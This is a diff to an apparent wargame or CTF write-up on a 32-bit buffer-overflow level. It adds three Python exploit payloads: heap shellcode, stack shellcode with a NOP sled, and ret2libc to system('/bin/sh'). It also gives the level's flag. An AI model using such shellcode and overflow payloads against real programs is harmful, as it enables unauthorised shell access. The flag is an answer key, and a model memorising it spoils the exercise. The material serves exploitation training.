@@ -51,8 +51,9 @@ the programm SEGFAULT with address __0x37634136__
 - result is 80
 - means the buffer overflow at 80 characters
 
-###solution 1:
-##### use the shellcode exploit 
+### there is 3 solutions:
+___
+##### 1:- use the shellcode exploit in the Hype
 since the programm calls strdup which calls malloc 
 that's mean a hype there baby :* 
 which mean we can use the address of tha allocated hype section to execute our shell code after we fill the buffer of 80 
@@ -79,10 +80,52 @@ shell code + padding + hypeAddress = 84
 ```python
 import struct
 shell_code = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-80 cd c9 31 e3 89 6e 69 62 2f 68 73 2f 2f 68 52 99 58 0b 6a
+#80 cd c9 31 e3 89 6e 69 62 2f 68 73 2f 2f 68 52 99 58 0b 6a
 padding = "A" * 55
-hypeAddress = struct.pack("I", 0x0804a008) # convert to little indian format
+hypeAddress = struct.pack("I", 0x0804a008) # convert the hyper address to little indian format
 
 pattern = shell_code + padding + hypeAddress
 print(pattern)
 ```
+___
+##### 2:- use the shellcode exploit in the Stack
+```python
+import struct
+
+padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" # length 80
+shellcode =  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+fakeAddr = struct.pack("I", 0x0804853e) # to bypass the return address check
+eip = struct.pack("I", 0xbffff700 + 40) # stack address but we move forward by 40 in order to fall into the nopslide
+nopslide  = "\x90" * 100 # \x90 == nothing == nosplide : 
+                         # when program get redirected to this aread of nops it will sldie to the shell code
+payload = shellcode
+
+print(padding + fakeAddr + eip + nopslide + payload)
+```
+___
+##### 3:- use Ret2Libc exploit in the stack
+
+
+```py
+import struct
+
+# buffer overflow offset is 80
+
+
+# p()    return_adress = 0x0804853e
+# main() return_adress = 0x0804854b
+
+padding = "\x90" * 80
+ret_adress = str(struct.pack("I", 0x0804853e)) #p() func ret addr
+system = str(struct.pack("I", 0xb7e6b060))
+returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0)) # address of exit() function , system need it 
+bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh
+
+payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
+#          80     +     4      +    4   +         4         +   4 
+print(payload)
+
+```
+
+
+#### flag : `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
